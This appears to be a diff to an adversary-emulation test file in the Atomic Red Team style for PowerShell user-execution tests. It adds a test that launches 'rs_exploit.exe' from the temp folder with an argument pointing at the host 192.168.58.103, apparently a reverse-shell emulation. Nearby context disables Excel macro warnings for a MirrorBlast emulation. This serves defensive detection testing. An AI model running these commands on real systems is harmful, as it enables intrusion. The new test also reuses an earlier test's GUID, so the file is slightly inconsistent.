@@ -422,10 +422,10 @@ atomic_tests:
       & '.\Excel 2016.lnk' PathToAtomicsFolder\T1204.002\bin\mirrorblast_emulation.xlsm
     cleanup_command: reg delete "HKCU\SOFTWARE\Microsoft\Office\16.0\Excel\Security" /v "VBAWarnings" /f
     name: powershell
-- name: Execution Via PowerShell Using 'Start-Process'
+- name: Execution Via PowerShell Using 'Start-Process' without argument
   auto_generated_guid: 5202ee05-c420-4148-bf5e-fd7f7d24850c
   description: |
-    Execution Via PowerShell Using 'Start-Process'
+    Execution Via PowerShell Using 'Start-Process' without argument
   supported_platforms:
     - windows
   input_arguments:
@@ -443,5 +443,33 @@ atomic_tests:
     name: powershell
     command: |
       Start-Process -FilePath "#{file_folder}\#{file_name}"
+    cleanup_command: |
+      taskkill /IM #{file_name} /F
+- name: Execution Via PowerShell Using 'Start-Process' with argument
+  auto_generated_guid: 5202ee05-c420-4148-bf5e-fd7f7d24850c
+  description: |
+    Execution Via PowerShell Using 'Start-Process' with argument
+  supported_platforms:
+    - windows
+  input_arguments:
+    file_folder:
+      description: |
+        folder to the file
+      type: String
+      default: $env:TEMP
+    file_name:
+      description: |
+        file name
+      type: String
+      default: rs_exploit.exe
+    arguments:
+      description: |
+        arguments
+      type: String
+      default: "/S 192.168.58.103"
+  executor:
+    name: powershell
+    command: |
+      Start-Process -FilePath "#{file_folder}\#{file_name}" -ArgumentList #{arguments}
     cleanup_command: |
       taskkill /IM #{file_name} /F
